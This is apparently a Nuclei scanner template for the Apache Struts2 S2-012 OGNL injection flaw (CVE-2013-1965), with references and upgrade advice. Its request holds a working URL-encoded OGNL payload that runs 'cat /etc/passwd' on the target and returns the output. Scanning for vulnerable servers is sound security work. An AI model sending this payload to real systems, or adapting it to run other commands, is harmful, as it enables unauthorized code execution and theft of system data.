id: CVE-2013-1965
info:
  name: Apache Struts2 S2-012 RCE
  author: pikpikcu
  severity: critical
  description: A vulnerability in the Apache Struts Showcase App allows attackers
    to execute arbitrary OGNL code remotely by exploiting a redirect vulnerability.
  reference:
  - http://struts.apache.org/development/2.x/docs/s2-012.html
  - https://nvd.nist.gov/vuln/detail/CVE-2013-1965
  - https://bugzilla.redhat.com/show_bug.cgi?id=967655
  remediation: Developers should immediately upgrade to Struts 2.3.14.3 or later.
  classification:
    cve-id: CVE-2013-1965
  tags: cve,cve2013,apache,rce,struts,ognl
  metadata:
    impact: The CVE-2013-1965 vulnerability in Apache Struts2 allowed remote attackers
      to execute arbitrary code through a crafted parameter name, resulting in a critical
      impact on the security of the system.
    recommendation: It is recommended to update to the latest version of Struts 2
      (2.3.14.3 or later) to prevent potential remote code execution attacks.
requests:
- method: POST
  path:
  - '{{BaseURL}}/user.action'
  headers:
    Content-Type: application/x-www-form-urlencoded
  body: 'name=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22cat%22%2C+%22%2Fetc%2Fpasswd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D

    '
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
